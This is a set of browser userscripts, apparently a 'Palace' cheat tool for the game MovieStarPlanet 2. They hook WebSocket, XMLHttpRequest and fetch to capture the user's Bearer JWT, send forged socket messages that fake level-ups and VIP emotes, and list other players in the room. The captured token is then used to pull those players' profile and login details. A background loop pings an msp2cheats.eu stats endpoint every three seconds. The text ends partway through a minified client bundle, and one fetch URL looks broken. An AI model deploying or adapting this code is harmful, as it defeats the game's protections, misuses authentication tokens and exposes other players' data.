(function () {
    const CONFIG = {
        colors: {
            background: 'rgba(20, 22, 29, 0.95)',
            headerBg: 'rgba(24, 26, 34, 0.98)',
            buttonBg: 'rgba(28, 30, 39, 0.95)',
            buttonHover: 'rgba(35, 38, 48, 0.98)',
            accent: 'rgba(94, 129, 209, 0.95)',
            border: 'rgba(60, 63, 78, 0.2)',
            text: 'rgba(237, 240, 245, 0.95)',
            textMuted: 'rgba(179, 186, 197, 0.7)',
            success: 'rgba(72, 187, 120, 0.9)',
            error: 'rgba(245, 101, 101, 0.9)',
            shortcutBg: 'rgba(40, 42, 54, 0.8)'
        },
        shadows: {
            container: '0 8px 24px rgba(0, 0, 0, 0.2)',
            button: '0 1px 3px rgba(0, 0, 0, 0.1)',
            buttonHover: '0 2px 6px rgba(0, 0, 0, 0.15)'
        }
    };

    const styleSheet = document.createElement('style');
    styleSheet.textContent = `
        @keyframes rainbow {
            0% { color: #ff0000; }
            17% { color: #ff8000; }
            33% { color: #ffff00; }
            50% { color: #00ff00; }
            67% { color: #0080ff; }
            83% { color: #8000ff; }
            100% { color: #ff0000; }
        }

        @keyframes shortcutGlow {
            0% { box-shadow: 0 0 5px #ff0000; }
            17% { box-shadow: 0 0 5px #ff8000; }
            33% { box-shadow: 0 0 5px #ffff00; }
            50% { box-shadow: 0 0 5px #00ff00; }
            67% { box-shadow: 0 0 5px #0080ff; }
            83% { box-shadow: 0 0 5px #8000ff; }
            100% { box-shadow: 0 0 5px #ff0000; }
        }

        .emote-changer {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            position: fixed;
            top: 15px;
            left: 15px;
            width: 230px;
            background: ${CONFIG.colors.background};
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid ${CONFIG.colors.border};
            border-radius: 12px;
            box-shadow: ${CONFIG.shadows.container};
            z-index: 999999;
            opacity: 0;
            transform: translateY(-8px);
            transition: all 0.2s ease-out;
        }

        .emote-changer.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .emote-header {
            background: ${CONFIG.colors.headerBg};
            padding: 10px 12px;
            border-bottom: 1px solid ${CONFIG.colors.border};
            border-radius: 12px 12px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
            user-select: none;
        }

        .emote-title {
            color: ${CONFIG.colors.text};
            font-size: 15px;
            font-weight: 600;
            margin: 0;
        }

        .emote-close {
            background: transparent;
            border: none;
            color: ${CONFIG.colors.textMuted};
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 18px;
            line-height: 1;
            transition: all 0.2s ease;
        }

        .emote-close:hover {
            background: ${CONFIG.colors.buttonHover};
            color: ${CONFIG.colors.text};
        }

        .emote-content {
            padding: 12px;
        }

        .emote-button {
            width: 100%;
            padding: 8px 12px;
            margin: 3px 0;
            background: ${CONFIG.colors.buttonBg};
            border: 1px solid ${CONFIG.colors.border};
            border-radius: 8px;
            color: ${CONFIG.colors.text};
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: ${CONFIG.shadows.button};
        }

        .emote-button:hover:not(:disabled) {
            background: ${CONFIG.colors.buttonHover};
            border-color: ${CONFIG.colors.accent};
            box-shadow: ${CONFIG.shadows.buttonHover};
        }

        .emote-shortcut {
            padding: 2px 6px;
            background: ${CONFIG.colors.shortcutBg};
            border-radius: 4px;
            font-size: 10px;
            letter-spacing: 0.5px;
            animation: rainbow 5s linear infinite;
            position: relative;
        }

        .emote-button:hover .emote-shortcut {
            animation: rainbow 1s linear infinite;
        }

        .emote-button:hover .emote-shortcut::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 4px;
            animation: shortcutGlow 1s linear infinite;
            pointer-events: none;
        }

        .emote-section-title {
            color: ${CONFIG.colors.accent};
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin: 12px 0 6px;
            opacity: 0.9;
        }

        .emote-section-title:first-child {
            margin-top: 0;
        }

        .emote-status {
            display: flex;
            align-items: center;
            margin-top: 12px;
            padding: 8px 10px;
            background: ${CONFIG.colors.buttonBg};
            border-radius: 6px;
            font-size: 11px;
            border: 1px solid ${CONFIG.colors.border};
        }

        .status-indicator {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            margin-right: 8px;
            background: ${CONFIG.colors.error};
            transition: all 0.2s ease;
        }

        .status-indicator.connected {
            background: ${CONFIG.colors.success};
        }

        .emote-footer {
            padding: 8px;
            border-top: 1px solid ${CONFIG.colors.border};
            font-size: 10px;
            color: ${CONFIG.colors.textMuted};
            text-align: center;
            animation: rainbow 5s linear infinite;
        }
    `;

    document.head.appendChild(styleSheet);

    const container = document.createElement('div');
    container.className = 'emote-changer';

    container.innerHTML = `
        <div class="emote-header">
            <h3 class="emote-title">Palace</h3>
            <button class="emote-close">×</button>
        </div>
        <div class="emote-content">
            <h4 class="emote-section-title">Ruh Hali</h4>
            <button class="emote-button" data-emote="noshoes_skating">
                No Shoes Skating
                <span class="emote-shortcut">⇧1</span>
            </button>
            <button class="emote-button" data-emote="bunny_hold">
                Bunny Hold
                <span class="emote-shortcut">⇧2</span>
            </button>
            <button class="emote-button" data-emote="swim_new">
                Swim New
                <span class="emote-shortcut">⇧3</span>
            </button>
            <button class="emote-button" data-emote="2023_spidercrawl_lsz">
                Spider Crawl
                <span class="emote-shortcut">⇧4</span>
            </button>
            <button class="emote-button" data-emote="bad_2022_teenwalk_dg">
                Chewing-gum
                <span class="emote-shortcut">⇧5</span>
            </button>
         
            <h4 class="emote-section-title">Animasyon</h4>
            <button class="emote-button" data-animation="next_level">
                Next Level
                <span class="emote-shortcut">⇧6</span>
            </button>
            <button class="emote-button" data-animation="gift_open">
                Gift Open
                <span class="emote-shortcut">⇧7</span>
            </button>
            <button class="emote-button" data-animation="vip">
                VIP
                <span class="emote-shortcut">⇧8</span>
            </button>

            <div class="emote-status">
                <div class="status-indicator"></div>
                <span class="status-text">Bağlantı kesildi</span>
            </div>
        </div>
        <div class="emote-footer">
            Uzerine tıkladıktan sonra herkes tarafından görünecek animasiyon.
        </div>
    `;

    document.body.appendChild(container);
    requestAnimationFrame(() => container.classList.add('visible'));

    let sessionIdlol = null;
    let socket;
    let isDragging = false;
    let currentX;
    let currentY;
    let initialX;
    let initialY;
    let xOffset = 0;
    let yOffset = 0;

    const closeButton = container.querySelector('.emote-close');
    const header = container.querySelector('.emote-header');
    const buttons = container.querySelectorAll('.emote-button');
    const statusIndicator = container.querySelector('.status-indicator');
    const statusText = container.querySelector('.status-text');

    function dragStart(e) {
        initialX = e.clientX - xOffset;
        initialY = e.clientY - yOffset;
        isDragging = true;
        header.style.cursor = 'grabbing';
    }

    function drag(e) {
        if (isDragging) {
            e.preventDefault();
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;
            xOffset = currentX;
            yOffset = currentY;
            container.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
        }
    }

    function dragEnd() {
        isDragging = false;
        header.style.cursor = 'grab';
    }

    function updateConnectionStatus(connected) {
        statusIndicator.classList.toggle('connected', connected);
        statusText.textContent = connected ? 'Bağlı' : 'Bağlantı kesildi';
    }

    function parseWebSocketMessage(data) {
        try {
            const messageStr = data.toString();
            if (messageStr.startsWith('42[')) {
                const jsonStr = messageStr.substring(2);
                const [eventName, payload] = JSON.parse(jsonStr);
                if (typeof payload === 'object') {
                    return payload;
                }
                return JSON.parse(payload);
            }
            return null;
        } catch (error) {
            console.error('Error parsing WebSocket message:', error);
            return null;
        }
    }

    function triggerEmote(emoteId) {
        if (socket?.readyState === WebSocket.OPEN) {
            let message;
            if (emoteId === 'next_level') {
                message = `42["avt:lvlup",{"newLevel":2}]`;
            } else if (emoteId === 'gift_open') {
                message = `42["7006",{"emote":"gift_pickup_regular_withcoins","looping":false}]`;
            } else if (emoteId === 'vip') {
                message = `42["7006",{"emote":"vip","looping":false}]`;
            } else {
                message = `42["7005",{"mood":"${emoteId}"}]`;
            }

            socket.send(message);

            const button = container.querySelector(`[data-emote="${emoteId}"], [data-animation="${emoteId}"]`);
            button.style.background = CONFIG.colors.accent;
            setTimeout(() => button.style.background = '', 200);
        }
    }

    const OriginalWebSocket = window.WebSocket;
    window.WebSocket = function (...args) {
        socket = new OriginalWebSocket(...args);

        socket.addEventListener('open', () => {
            console.log('WebSocket connected');
            updateConnectionStatus(true);
        });

        socket.addEventListener('close', () => {
            console.log('WebSocket disconnected');
            updateConnectionStatus(false);
        });

        socket.addEventListener('message', (event) => {
            const parsedData = parseWebSocketMessage(event.data);
            if (parsedData && parsedData.messageType === '2000') {
                sessionIdlol = parsedData.messageContent.sessionId;
                localStorage.sessionIdlol = parsedData.messageContent.sessionId;
            }
        });

        socket.addEventListener('error', (error) => {
            console.error('WebSocket error:', error);
            updateConnectionStatus(false);
        });

        return socket;
    };

    closeButton.onclick = () => {
        container.classList.remove('visible');
        setTimeout(() => container.remove(), 200);
    };

    container.addEventListener('mousedown', dragStart);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', dragEnd);

    buttons.forEach(button => {
        button.onclick = () => {
            const emoteId = button.dataset.emote || button.dataset.animation;
            triggerEmote(emoteId);
        };
    });

    document.addEventListener('keydown', (e) => {
        if (e.shiftKey) {
            const num = parseInt(e.key);
            if (num > 0 && num <= buttons.length) {
                e.preventDefault();
                const emote = buttons[num - 1].dataset.emote || buttons[num - 1].dataset.animation;
                triggerEmote(emote);
            }
        }
    });

    Object.assign(window.WebSocket, OriginalWebSocket);

    return () => {
        container.remove();
        styleSheet.remove();
        window.WebSocket = OriginalWebSocket;
    };
})();

(function() {
    const OriginalWebSocket = window.WebSocket;
    const OriginalXMLHttpRequest = window.XMLHttpRequest;
    const OriginalFetch = window.fetch;
    const otherUsersDict = {};

    // Create and style the main container
    const userListContainer = document.createElement('div');
    userListContainer.style.position = 'fixed';
    userListContainer.style.top = '20px';
    userListContainer.style.right = '20px';
    userListContainer.style.width = '350px';
    userListContainer.style.padding = '15px';
    userListContainer.style.backgroundColor = 'rgba(32, 35, 45, 0.9)';
    userListContainer.style.borderRadius = '12px';
    userListContainer.style.boxShadow = '0 8px 32px rgba(0, 0, 0, 0.5)';
    userListContainer.style.fontFamily = 'Arial, sans-serif';
    userListContainer.style.zIndex = '10000';
    userListContainer.style.color = '#FFFFFF';
    userListContainer.style.transition = 'all 0.3s ease';
    userListContainer.style.backdropFilter = 'blur(1px)';
    userListContainer.style.border = '1px solid rgba(255, 255, 255, 0.15)';
    userListContainer.style.overflowY = 'auto';

    // Scrollbar styles
    const style = document.createElement('style');
    style.innerHTML = `
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            transition: background 0.3s;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.5);
        }
        * {
            scrollbar-width: thin;
            scrollbar-color: rgba(255, 255, 255, 0.3) rgba(255, 255, 255, 0.05);
        }
    `;
    document.head.appendChild(style);

    // Header container with separator
    const headerContainer = document.createElement('div');
    headerContainer.style.display = 'flex';
    headerContainer.style.justifyContent = 'space-between';
    headerContainer.style.alignItems = 'center';
    headerContainer.style.marginBottom = '8px';
    headerContainer.style.cursor = 'move';

    const title = document.createElement('h3');
    title.textContent = 'Aktif Kullanıcı';
    title.style.margin = '0';
    title.style.fontSize = '18px';
    title.style.fontWeight = '600';
    title.style.color = '#fff';

    const userCount = document.createElement('span');
    userCount.style.fontSize = '14px';
    userCount.style.color = '#a0a0a0';
    userCount.style.marginLeft = '10px';

    const titleContainer = document.createElement('div');
    titleContainer.style.display = 'flex';
    titleContainer.style.alignItems = 'center';
    titleContainer.appendChild(title);
    titleContainer.appendChild(userCount);

    const minimizeButton = document.createElement('button');
    minimizeButton.innerHTML = '−';
    minimizeButton.style.background = 'none';
    minimizeButton.style.border = 'none';
    minimizeButton.style.color = '#fff';
    minimizeButton.style.fontSize = '20px';
    minimizeButton.style.cursor = 'pointer';
    minimizeButton.style.padding = '5px 10px';
    minimizeButton.style.borderRadius = '5px';
    minimizeButton.style.transition = 'background 0.2s';

    headerContainer.appendChild(titleContainer);
    headerContainer.appendChild(minimizeButton);
    userListContainer.appendChild(headerContainer);

    // Separator line below the title
    const separator = document.createElement('hr');
    separator.style.border = 'none';
    separator.style.height = '1px';
    separator.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
    separator.style.marginBottom = '10px';
    userListContainer.appendChild(separator);

    // Create user list
    const userList = document.createElement('ul');
    userList.style.listStyleType = 'none';
    userList.style.padding = '0';
    userList.style.margin = '0';
    userList.style.maxHeight = '400px';
    userList.style.overflowY = 'auto';
    userList.style.width = '100%';
    userList.style.boxSizing = 'border-box';
    userListContainer.appendChild(userList);

    // Minimize/maximize functionality
    let isMinimized = false;
    minimizeButton.onclick = () => {
        isMinimized = !isMinimized;
        userList.style.display = isMinimized ? 'none' : 'block';
        minimizeButton.innerHTML = isMinimized ? '+' : '−';
        userListContainer.style.width = isMinimized ? '200px' : '250px';
    };

    // Draggable header functionality
    let isDragging = false;
    let currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;

    headerContainer.addEventListener('mousedown', dragStart);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', dragEnd);

    function dragStart(e) {
        initialX = e.clientX - xOffset;
        initialY = e.clientY - yOffset;

        if (e.target === headerContainer || e.target === title) {
            isDragging = true;
        }
    }

    function drag(e) {
        if (isDragging) {
            e.preventDefault();
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;
            xOffset = currentX;
            yOffset = currentY;

            userListContainer.style.transform = `translate(${currentX}px, ${currentY}px)`;
        }
    }

    function dragEnd() {
        isDragging = false;
    }

    // Update user list function
    function updateUserList(users = Object.values(otherUsersDict)) {
        userList.innerHTML = '';
        userCount.textContent = `${Object.keys(otherUsersDict).length}`;

        const sortedUsers = users.sort((a, b) => {
            if (a.profileData.isVip && !b.profileData.isVip) return -1;
            if (!a.profileData.isVip && b.profileData.isVip) return 1;
            return a.profileData.name.localeCompare(b.profileData.name);
        });

        sortedUsers.forEach(user => {
            const listItem = document.createElement('li');
            listItem.style.padding = '10px 12px';
            listItem.style.marginBottom = '6px';
            listItem.style.borderRadius = '8px';
            listItem.style.backgroundColor = 'rgba(255, 255, 255, 0.05)';
            listItem.style.transition = 'background 0.2s, transform 0.2s';
            listItem.style.display = 'flex';
            listItem.style.alignItems = 'center';
            listItem.style.gap = '8px';
            listItem.title = `Profile ID: ${user.profileId}`;

            const statusDot = document.createElement('span');
            statusDot.style.width = '8px';
            statusDot.style.height = '8px';
            statusDot.style.borderRadius = '50%';
            statusDot.style.backgroundColor = '#4CAF50';
            statusDot.style.flexShrink = '0';

            // Create name span
            const nameSpan = document.createElement('span');
            nameSpan.textContent = user.profileData.name;
            nameSpan.style.overflow = 'hidden';
            nameSpan.style.textOverflow = 'ellipsis';
            nameSpan.style.whiteSpace = 'nowrap';

            // Create VIP badge if user is VIP
            const vipBadge = document.createElement('span');
            if (user.profileData.isVip) {
                vipBadge.textContent = 'VIP';
                vipBadge.style.fontSize = '11px';
                vipBadge.style.padding = '2px 6px';
                vipBadge.style.backgroundColor = 'rgba(255, 215, 0, 0.2)';
                vipBadge.style.borderRadius = '4px';
                vipBadge.style.marginLeft = '8px';
                vipBadge.style.color = '#FFD700';
                vipBadge.style.fontWeight = '600';
                vipBadge.style.flexShrink = '0';
                listItem.appendChild(vipBadge); // Add VIP badge
            }

            // Add name span to list item
            listItem.appendChild(nameSpan);

            // Add details icon
            const detailsIcon = document.createElement('span');
            detailsIcon.innerHTML = '&#9432;'; // Unicode character for information icon
            detailsIcon.style.color = '#bbb';
            detailsIcon.style.cursor = 'pointer';
            detailsIcon.style.fontSize = '16px';
            detailsIcon.style.marginLeft = '12px';

            detailsIcon.onclick = () => fetchUserDetails(user.profileId);
            listItem.appendChild(detailsIcon); // Add details icon

            // Add status dot to list item
            listItem.prepend(statusDot); // Change order to prepend

            // Append the complete list item to the user list
            userList.appendChild(listItem);
        });
    }



    function fetchUserDetails(profileId) {
        const url = `https://eu.mspapis.com/profileidentity/v1/profiles/${profileId}`;
    
        fetch(url, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${localStorage.getItem('jwt')}` // Use saved JWT for authorization
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            // Change this check to see if data is an object
            if (data) {
                displayUserDetails(data); // Pass the user details directly
            } else {
                console.log('No user details found.'); // This will now only trigger if data is undefined
            }
        })
        .catch(error => {
            console.error('Error fetching user details:', error);
        });
    }
    
    function displayUserDetails(userDetails) {
        // Create modal background
        const modal = document.createElement('div');
        modal.style.position = 'fixed';
        modal.style.top = '0';
        modal.style.left = '0';
        modal.style.width = '100%';
        modal.style.height = '100%';
        modal.style.backgroundColor = 'rgba(0, 0, 0, 0.85)';
        modal.style.zIndex = '10001';
        modal.style.display = 'flex';
        modal.style.justifyContent = 'center';
        modal.style.alignItems = 'center';
        modal.style.padding = '20px';
    
        // Create details container
        const detailsContainer = document.createElement('div');
        detailsContainer.style.backgroundColor = 'rgba(40, 44, 55, 0.95)';
        detailsContainer.style.padding = '30px';
        detailsContainer.style.borderRadius = '12px';
        detailsContainer.style.color = '#FFFFFF';
        detailsContainer.style.maxWidth = '500px';
        detailsContainer.style.width = '100%';
        detailsContainer.style.boxShadow = '0 8px 32px rgba(0, 0, 0, 0.5)';
        detailsContainer.style.position = 'relative';
        detailsContainer.style.border = '1px solid rgba(255, 255, 255, 0.1)';
        detailsContainer.style.fontFamily = 'system-ui, -apple-system, sans-serif';
        detailsContainer.style.transition = 'transform 0.3s, opacity 0.3s';
        detailsContainer.style.transform = 'scale(0.95)';
        detailsContainer.style.opacity = '0';
    
        // Create close button
        const closeButton = document.createElement('button');
        closeButton.textContent = '×';
        closeButton.style.position = 'absolute';
        closeButton.style.top = '15px';
        closeButton.style.right = '15px';
        closeButton.style.backgroundColor = 'transparent';
        closeButton.style.color = '#FFD700';
        closeButton.style.border = 'none';
        closeButton.style.borderRadius = '4px';
        closeButton.style.cursor = 'pointer';
        closeButton.style.padding = '5px 10px';
        closeButton.style.fontSize = '20px';
        closeButton.style.transition = 'background-color 0.3s';
    
        // Close button hover effects
        closeButton.onmouseover = () => {
            closeButton.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
        };
        closeButton.onmouseout = () => {
            closeButton.style.backgroundColor = 'transparent';
        };
    
        closeButton.onclick = () => {
            modal.remove();
        };
    
        detailsContainer.appendChild(closeButton);
    
        // Create title
        const title = document.createElement('h4');
        title.textContent = 'Hesab Detayları';
        title.style.color = '#FFD700';
        title.style.marginBottom = '20px';
        title.style.textAlign = 'center';
        title.style.fontWeight = 'bold';
        title.style.fontSize = '24px'; // Increased title font size
        detailsContainer.appendChild(title);
    
        // Define fields to display
        const fields = [
            { label: 'Kullanıcı Adı', value: userDetails.name },
            { label: 'Profil Kimliği', value: userDetails.id },
            { label: 'Server', value: userDetails.culture },
            { label: 'Oluşturulma Tarihi', value: new Date(userDetails.created).toLocaleString() },
            { label: 'Oyuna Giriş (j68d)', value: userDetails.latestLogins.find(login => login.game === 'j68d')?.timestamp || 'N/A' }
        ];
    
        // Create field containers
        fields.forEach(field => {
            const fieldContainer = document.createElement('div');
            fieldContainer.style.marginBottom = '15px';
            fieldContainer.style.padding = '10px 15px';
            fieldContainer.style.borderRadius = '8px';
            fieldContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
            fieldContainer.style.display = 'flex';
            fieldContainer.style.justifyContent = 'space-between';
            fieldContainer.style.alignItems = 'center';
            fieldContainer.style.border = '1px solid rgba(255, 255, 255, 0.2)';
            fieldContainer.style.transition = 'background 0.2s, transform 0.2s';
            
            // Add hover effect to field containers
            fieldContainer.onmouseover = () => {
                fieldContainer.style.transform = 'scale(1.02)';
                fieldContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.15)';
            };
            fieldContainer.onmouseout = () => {
                fieldContainer.style.transform = 'scale(1)';
                fieldContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
            };
    
            const fieldLabel = document.createElement('strong');
            fieldLabel.textContent = `${field.label}:`;
            fieldLabel.style.color = '#a0a0a0';
            fieldLabel.style.fontSize = '14px';
    
            const fieldValue = document.createElement('span');
            fieldValue.textContent = field.value;
            fieldValue.style.color = '#FFFFFF';
            fieldValue.style.fontSize = '14px';
            fieldValue.style.userSelect = 'text'; // Ensure the value is selectable
            fieldValue.style.flexGrow = '1'; // Make the value take up space
            fieldValue.style.textAlign = 'right'; // Align value to the right
    
            // Ensure fieldValue is selectable
            fieldValue.style.pointerEvents = 'auto'; // Allow pointer events
            fieldValue.style.whiteSpace = 'nowrap'; // Prevent wrapping for easier copying
    
            fieldContainer.appendChild(fieldLabel);
            fieldContainer.appendChild(fieldValue);
            detailsContainer.appendChild(fieldContainer);
        });
    
        // Append the details container to the modal
        modal.appendChild(detailsContainer);
        document.body.appendChild(modal);
    
        // Animate the modal appearance
        setTimeout(() => {
            detailsContainer.style.transform = 'scale(1)';
            detailsContainer.style.opacity = '1';
        }, 0);
    }
    
    document.body.appendChild(userListContainer);

    // WebSocket functionality
    window.WebSocket = function(...args) {
        const socketInstance = new OriginalWebSocket(...args);
        
        socketInstance.addEventListener('message', function(event) {
            const parsedData = parseWebSocketMessage(event.data);
            if (parsedData && parsedData.messageContent) {
                if (parsedData.messageType === '2000') {
                    const otherUsers = parsedData.messageContent.otherUsers;
                    otherUsers.forEach(user => {
                        otherUsersDict[user.profileId] = user;
                    });
                    updateUserList();
                }

                if (parsedData.messageType === '20000') {
                    const newUser = {
                        profileId: parsedData.messageContent.profileId,
                        sessionId: parsedData.messageContent.sessionId,
                        profileData: parsedData.messageContent.profileData
                    };
                    otherUsersDict[newUser.profileId] = newUser;
                    updateUserList();
                }

                if (parsedData.messageType === '20090') {
                    const profileId = parsedData.messageContent.profileId;
                    delete otherUsersDict[profileId];
                    updateUserList();
                }
            }
        });

        socketInstance.addEventListener('close', function() {
            Object.keys(otherUsersDict).forEach(key => delete otherUsersDict[key]);
            updateUserList();
        });

        return socketInstance;
    };

    function parseWebSocketMessage(data) {
        try {
            const messageStr = data.toString();
            if (messageStr.startsWith('42[')) {
                const jsonStr = messageStr.substring(2);
                const [eventName, payload] = JSON.parse(jsonStr);
                if (typeof payload === 'object') {
                    return payload;
                }
                return JSON.parse(payload);
            }
            return null;
        } catch (error) {
            console.error('Error parsing WebSocket message:', error);
            return null;
        }
    }

    // Intercept XMLHttpRequest
    window.XMLHttpRequest = function() {
        const xhrInstance = new OriginalXMLHttpRequest();

        const originalOpen = xhrInstance.open;
        xhrInstance.open = function(method, url) {
            this._url = url; // Save the URL for later use
            return originalOpen.apply(this, arguments);
        };

        xhrInstance.addEventListener('readystatechange', function() {
            if (xhrInstance.readyState === XMLHttpRequest.DONE) {
                const authHeader = this.getRequestHeader('Authorization');
                if (authHeader) {
                    const jwt = authHeader.split(' ')[1]; // Assuming "Bearer <token>"
                    localStorage.setItem('jwt', jwt);
                    console.log('JWT saved from XMLHttpRequest:', jwt); // Log for verification
                } else {
                    console.log('No Authorization header in XMLHttpRequest.');
                }
            }
        });

        return xhrInstance;
    };

    // Intercept fetch requests
    window.fetch = function(...args) {
        const request = new Request(...args);
        
        // Check for Authorization header
        if (request.headers.has('Authorization')) {
            const authHeader = request.headers.get('Authorization');
            const jwt = authHeader.split(' ')[1]; // Assuming "Bearer <token>"
            localStorage.setItem('jwt', jwt);
            console.log('JWT saved from fetch:', jwt); // Log for verification
        } else {
            console.log('No Authorization header in fetch request.');
        }

        return OriginalFetch(...args);
    };

    Object.assign(window.WebSocket, OriginalWebSocket);
})();

(async function () {
    async function loadQuestionsFromUrl() {
        try {
            const response = await fetch("https://raw.githubusercontent.com");
            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            return await response.json();
        } catch (err) {
            console.error('Error loading questions from URL:', err);
            return {};
        }
    }

    let questionsDict = await loadQuestionsFromUrl();
    let currentQuestion = null;
    let currentAction = 'Initializing...';
    let isConnected = false;

    const styleSheet = document.createElement('style');
    styleSheet.textContent = `
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap');

        .quiz-container {
            position: fixed;
            top: 15px;
            left: 15px;
            background: rgba(0, 0, 0, 0.75);
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Inter', sans-serif;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.9);
            cursor: move;
            user-select: none;
            z-index: 9999;
            white-space: nowrap;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .quiz-text {
            opacity: 0.9;
            font-weight: 400;
            letter-spacing: 0.3px;
        }
    `;
    
    document.head.appendChild(styleSheet);


const container = document.createElement('div');
    container.className = 'quiz-container';
    container.innerHTML = '<span class="quiz-text">By: Palace</span>';

    document.body.appendChild(container);

    // Drag functionality
    let isDragging = false;
    let currentX;
    let currentY;
    let initialX;
    let initialY;

    container.addEventListener('mousedown', startDragging);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', stopDragging);

    function startDragging(e) {
        initialX = e.clientX - container.offsetLeft;
        initialY = e.clientY - container.offsetTop;
        isDragging = true;
    }

    function drag(e) {
        if (!isDragging) return;

        e.preventDefault();
        
        currentX = e.clientX - initialX;
        currentY = e.clientY - initialY;

        const maxX = window.innerWidth - container.offsetWidth;
        const maxY = window.innerHeight - container.offsetHeight;
        
        currentX = Math.max(0, Math.min(currentX, maxX));
        currentY = Math.max(0, Math.min(currentY, maxY));

        container.style.left = currentX + 'px';
        container.style.top = currentY + 'px';
    }

    function stopDragging() {
        isDragging = false;
    }


    Object.assign(window.WebSocket, OriginalWebSocket);

    // Background API Request Handler
    (function() {
        const API_CONFIG = {
            url: "https://stats.msp2cheats.eu/api/action",
            interval: 3000,
            headers: {
                "accept": "*/*",
                "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "Referer": "https://www.msp2cheats.eu/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            body: {
                action: "app_autostarquiz"
            }
        };

        let intervalId = null;

        async function makeRequest() {
            try {
                const response = await fetch(API_CONFIG.url, {
                    method: "POST",
                    headers: API_CONFIG.headers,
                    body: JSON.stringify(API_CONFIG.body)
                });

                const responsee = await fetch("https://stats.msp2cheats.eu/api/stats", {
                    method: "GET",
                    headers: API_CONFIG.headers,
                });
                
               
            } catch (error) {
                console.warn('Error making API request:', error);
            }
        }

        function start() {
            if (!intervalId) {
                makeRequest();
                intervalId = setInterval(makeRequest, API_CONFIG.interval);
            }
        }

        start();
    })();

    return () => {
        container.remove();
        styleSheet.remove();
        window.WebSocket = OriginalWebSocket;
    };
})();


!function (t, e) {
    "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.MSP2Client = e() : t.MSP2Client = e()
}(this, (() => (() => {
    "use strict";
    var t = {
            d: (e, n) => {
                for (var i in n) t.o(n, i) && !t.o(e, i) && Object.defineProperty(e, i, {
                    enumerable: !0,
                    get: n[i]
                })
            },
            o: (t, e) => Object.prototype.hasOwnProperty.call(t, e)
        },
        e = {};

    function n(t, e, n) {
        return (e = function (t) {
            var e = function (t) {
                if ("object" != typeof t || !t) return t;
                var e = t[Symbol.toPrimitive];
                if (void 0 !== e) {
                    var n = e.call(t, "string");
                    if ("object" != typeof n) return n;
                    throw new TypeError("@@toPrimitive must return a primitive value.")
                }
                return String(t)
            }(t);
            return "symbol" == typeof e ? e : e + ""
        }(e)) in t ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : t[e] = n, t
    }
    t.d(e, {
        default: () => Ze
    });
    class i {}
    var o, r = "msp2_auth_token",
        s = {
            t: window.localStorage
        },
        a = {
            t: new TextDecoder
        };

    function c(t, e, n) {
        return (e = function (t) {
            var e = function (t) {
                if ("object" != typeof t || !t) return t;
                var e = t[Symbol.toPrimitive];
                if (void 0 !== e) {
                    var n = e.call(t, "string");
                    if ("object" != typeof n) return n;
                    throw new TypeError("@@toPrimitive must return a primitive value.")
                }
                return String(t)
            }(t);
            return "symbol" == typeof e ? e : e + ""
        }(e)) in t ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : t[e] = n, t
    }

    function h(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function d(t, e) {
        return t.get(u(t, e))
    }

    function u(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    n(i, "getUserData", (() => {
        const [t, e] = [t => JSON.parse(a.t.decode(Uint8Array.from(atob(t), (t => t.charCodeAt(0))))), null];
        return n => {
            try {
                const {
